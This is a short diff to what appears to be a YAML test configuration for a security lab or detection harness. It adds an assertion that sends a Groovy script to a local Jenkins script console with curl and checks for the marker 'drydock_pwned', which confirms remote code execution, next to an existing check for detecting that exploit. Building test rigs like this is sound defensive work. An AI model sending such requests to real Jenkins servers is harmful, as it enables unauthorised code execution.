@@ -15,6 +15,12 @@ ready:
   interval: 5s
 
 assertions:
+  - name: exploit-jenkins-script-console
+    type: command
+    expect:
+      command: "curl -sf -X POST 'http://localhost:9271/scriptText' -d 'script=println(\"drydock_pwned\")' | grep -q drydock_pwned"
+      exit_code: 0
+
   - name: detects-jenkins-groovy-rce
     type: beacon
     target: jenkins:8080
